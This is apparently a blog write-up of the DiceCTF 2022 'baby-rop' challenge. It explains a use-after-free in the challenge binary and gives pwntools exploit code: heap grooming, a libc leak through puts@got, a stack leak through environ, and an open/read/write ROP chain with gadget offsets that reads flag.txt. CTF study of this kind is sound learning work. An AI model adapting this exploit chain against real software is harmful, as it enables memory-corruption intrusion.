[{"content":"ctf.dicega.ng - baby-rop Challenge link: https://ctf.dicega.ng/challs\nYou can also download challenge file from my repo: baby-rop.zip\nThere will be 5 files in zip:\nbabyrop ld-linux-x86-64.so.2 libc.so.6 seccomp-bpf.h uaf.c You can use patchelf or attached file \u0026ldquo;patch.sh\u0026rdquo; to patch file.\nDisclamer: This repo for studying purpose only. Origin writeup here.\nAnd when everything\u0026rsquo;s ready, let\u0026rsquo;s start!\n1. Find bug First, we will use file to check information of challenge:\nbabyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=22e8dcbaa41a9ddd0d137d3f83de9d9eee392236, not stripped This is a 64-bit file without being stripped. That\u0026rsquo;s sound great when we need to debug. Next, we will use checksec to check for security of challenge:\nArch: amd64-64-little\rRELRO: Full RELRO\rStack: No canary found\rNX: NX enabled\rPIE: No PIE (0x3fe000) We can see that with Full RELRO, we cannot overwrite any GOT (maybe not necessary), and NX enabled, a non-execute stack. Finally, let\u0026rsquo;s open given source code uaf.c for futher analysis. We can see at the begining of source, there is a seccomp filter:\nstruct sock_filter filter[] = {\rVALIDATE_ARCHITECTURE,\rEXAMINE_SYSCALL,\rALLOW_SYSCALL(mprotect),\rALLOW_SYSCALL(mmap),\rALLOW_SYSCALL(munmap),\rALLOW_SYSCALL(exit_group),\rALLOW_SYSCALL(read),\rALLOW_SYSCALL(write),\rALLOW_SYSCALL(open),\rALLOW_SYSCALL(close),\rALLOW_SYSCALL(openat),\rALLOW_SYSCALL(fstat),\rALLOW_SYSCALL(brk),\rALLOW_SYSCALL(newfstatat),\rALLOW_SYSCALL(ioctl),\rALLOW_SYSCALL(lseek),\rKILL_PROCESS,\r}; The filter restricts the number of syscall we can use. But with syscall open, read and write is enough for reading flag. The next part of source code we notice is:\nvoid free_safe_string(int i) {\rsafe_string * ptr = data_storage[i];\rfree(ptr-\u0026gt;string);\rfree(ptr);\r} Freeing without removing pointer will result to Use After Free. That\u0026rsquo;s all interesting things we can get from static analysis. Now let\u0026rsquo;s brainstorming!\n2. Brainstorming As origin writeup above said:\nIn many of these type of CTF challenges you usually end up creating 10 or so allocations, freeing them, then creating a larger one that can write to previously allocated memory with pointers we want to control that have existing pointers pointing to them.\nSo we just try to create all 10 chunk and free them, then create a larger chunk to see what happen:\ngef➤ x/10xg \u0026amp;data_storage\r0x404040 \u0026lt;data_storage\u0026gt;:\t0x0000000000774960\t0x0000000000774730\r0x404050 \u0026lt;data_storage+16\u0026gt;:\t0x00000000007747a0\t0x0000000000774810\r0x404060 \u0026lt;data_storage+32\u0026gt;:\t0x0000000000774880\t0x00000000007748f0\r0x404070 \u0026lt;data_storage+48\u0026gt;:\t0x0000000000774960\t0x00000000007749d0\r0x404080 \u0026lt;data_storage+64\u0026gt;:\t0x0000000000774a40\t0x0000000000774ab0\rgef➤ x/2xg 0x0000000000774960\t# Check data_storage[0]\r0x774960:\t0x0000000000000420\t0x00000000007749d0\rgef➤ x/s0x00000000007749d0\t# Check data_storage[7]\r0x7749d0:\t\u0026#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaak\u0026#34; We can see that string of index 0 (data_storage[0][1]) will write to struct of index 7 (data_storage[7]). That\u0026rsquo;s cool! With that, we can write out a size of 6 with put@got as the address to struct index 7, then read it from the program menu to leak libc.\nWith that in hand, do it again, but this time with libc.sym['environ'] to get a stack leak. From there we can compute the distance in GDB from the environment to the saved rip on the stack. And with that location known, well we just write out a ROP chain.\nSummary:\nLeak address Create ROP chain and get flag 3. Exploit def create(index, length, data):\rp.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;C\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, \u0026#39;{}\u0026#39;.format(index).encode())\rp.sendlineafter(b\u0026#39;How long is your safe_string:\u0026#39;, \u0026#39;{}\u0026#39;.format(length).encode())\rp.sendafter(b\u0026#39;enter your string:\u0026#39;, data)\rdef free(index):\rp.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;F\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, \u0026#39;{}\u0026#39;.format(index).encode())\rdef read(index):\rp.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;R\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, \u0026#39;{}\u0026#39;.format(index).encode())\rreturn p.recvuntil(b\u0026#39;enter\u0026#39;)\rdef write(index, data):\rp.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;W\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, \u0026#39;{}\u0026#39;.format(index).encode())\rp.sendafter(b\u0026#39;enter your string:\u0026#39;, data) These function for handy use.\nStep 1: Leak address We just create and free 10 chunk, then create a larger chunk and we can control a chunk struct:\nfor i in range(10):\rcreate(i, 0x40, \u0026#39;{}\u0026#39;.format(i).encode()*8)\rfor i in range(10):\rfree(i)\rcreate(0, 0x420, cyclic(0x420)) Next, we will write address of puts@got and then write it out:\nwrite(0, flat(0x8, exe.got[\u0026#39;puts\u0026#39;]))\rprint(read(7)) After getting puts address, we calculate libc base and libc.sym['environ'] to leak environment stack address, then we get saved rip of main by calculating the distance from the environment address to the return address on the stack.\nHowever the offset may not the same for local and remote systems. If not exact, it is usually close, so just test +/- 8, 16, etc\u0026hellip; until you found it.\nStep 2: Create ROP chain and get flag At first, I used syscall but then I recognize after syscall, there is no ret so I change to use open, read and write from libc. So that, we will need these gadget for our rop:\npop_rdx_ret = libc.address + 0x00000000000d9c2d\rpop_rdi_ret = libc.address + 0x000000000002d7dd\rpop_rsi_ret = libc.address + 0x000000000002eef9\rxchg_eax_edi_ret = libc.address + 0x000000000014683c After a open, we have file descryptor in rax but there is no mov so we will use xchg instead. Our ROP chain will be like this:\nstr_flag = return_addr + 0x70\rstr_flag_context = str_flag + 0x8\rrop = flat(pop_rdi_ret, str_flag, pop_rsi_ret, 0, libc.sym[\u0026#39;open\u0026#39;])\rrop += flat(xchg_eax_edi_ret, pop_rsi_ret, str_flag_context, pop_rdx_ret, 0x200, libc.sym[\u0026#39;read\u0026#39;])\rrop += flat(pop_rdi_ret, 1, libc.sym[\u0026#39;write\u0026#39;])\rrop += flat(b\u0026#39;flag.txt\\x00\u0026#39;)\rwrite(0, flat(len(rop), return_addr))\rwrite(7, rop) 0x70 is the offset from rip to string flag.txt. If everything goes well, when we exit, we can get the flag.\np.sendlineafter(b\u0026#39;command:\u0026#39;, b\u0026#39;E\u0026#39;)\rp.sendlineafter(b\u0026#39;enter your index:\u0026#39;, b\u0026#39;0\u0026#39;) Full code: solve.py\n4. Get flag Flag is dice{glibc_2.34_stole_my_function_pointers-but_at_least_nobody_uses_intel_CET}\n","description":"Practice write up mark down file","id":0,"section":"posts","tags":["ctf","pwn","ROP"],"title":"DiceCTF 2022 Writeups","uri":"http://example.org/posts/dicectf2022/"}]